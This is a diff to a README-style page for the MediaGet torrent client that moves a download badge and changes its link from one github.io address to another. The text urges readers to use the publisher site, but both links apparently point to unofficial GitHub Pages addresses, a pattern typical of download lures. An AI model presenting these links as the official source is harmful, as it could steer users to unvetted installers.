@@ -6,6 +6,8 @@ mediaget client is the window you leave open. mediaget torrent client is the par
 
 Use the publisher site. Some installers have been flagged by security tools as unwanted extras, because a setup can bundle other software or leave a background task. Decline every offer that is not the client itself.
 
+[![GET MediaGet](https://img.shields.io/badge/GET-MediaGet-9F1239?style=flat-square&labelColor=4C0519&logoColor=white)](https://mediaget-pc.github.io/MediaGet/)
+
 ## About
 
 You give it a title or a link. It shows results. You pick a file, or a whole pack, and the queue starts. When the file is complete, the player can open it without a second program.
@@ -89,8 +91,6 @@ Seeding is optional. Leave it on if you are sharing a file you made. Turn it off
 ## Fetch the client
 
 One installer from the publisher. Desktop for Windows. One button.
-
-[![GET MediaGet](https://img.shields.io/badge/GET-MediaGet-9F1239?style=flat-square&labelColor=4C0519&logoColor=white)](https://albygypw13.github.io/.github/MediaGet)
 
 MediaGet PC is that download. Do not take a repack that adds a browser or a toolbar. If a security tool warns on the file, stop and fetch it again from the publisher page.
 
